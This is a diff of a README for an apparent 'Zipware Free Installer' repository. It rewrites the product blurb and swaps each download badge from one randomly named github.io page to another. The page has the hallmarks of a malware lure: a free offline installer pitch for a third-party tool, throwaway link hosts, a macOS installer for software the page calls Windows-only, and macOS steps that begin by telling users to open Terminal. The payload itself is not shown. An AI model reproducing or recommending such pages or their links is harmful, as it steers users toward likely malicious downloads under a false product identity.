@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Archive+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Zipware Free Installer** — Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR, ISO, and many other archive formats. Works without internet access, no account required. Full offline installation.
+**💻 Zipware Free Installer** — Zipware is a free, lightweight Windows archive manager supporting ZIP, 7Z, RAR, TAR, and other formats. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Zipware
 
-Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR, ISO, and many other archive formats. Create, extract, and manage archives with a simple, clean interface. Zipware supports AES-256 encryption, multi-part archives, and self-extracting executable creation. Its lightweight design and lack of advertising make it a clean alternative to feature-heavy archive managers.
+Zipware is a free, lightweight Windows archive manager supporting ZIP, 7Z, RAR, TAR, and other formats. It provides a simple interface for creating, extracting, and browsing archives with drag-and-drop support and strong encryption for ZIP files.
 
 ---
 
 ## ❌ Problem: Zipware is hard to access
 
-- **Windows Only** — No macOS or Linux version
-- **Feature Set** — Less feature-rich than WinRAR or 7-Zip for advanced archive management
-- **RAR Creation** — Cannot create RAR archives; extraction only
-- **Update Frequency** — Updates less frequent than major archive tools
+- **Windows Only** — Not available on macOS or Linux
+- **Basic Feature Set** — Less capable than 7-Zip or PeaZip for advanced archive operations
+- **Development Pace** — Updates arrive infrequently
+- **Limited RAR Creation** — Can extract RAR archives but RAR creation not supported
 
 ---
 
@@ -61,9 +61,9 @@ Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR,
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR,
 
 <div align="center">
 
-[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR,
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR,
 
 ---
 
-**Zipware Free Installer** — Zipware is a free archive manager for Windows that handles ZIP, RAR, 7-Zip, TAR, ISO, and many other archive formats. Install without internet connection today!
+**Zipware Free Installer** — Zipware is a free, lightweight Windows archive manager supporting ZIP, 7Z, RAR, TAR, and other formats. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Zipware](https://img.shields.io/badge/⬇_Install_Zipware-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
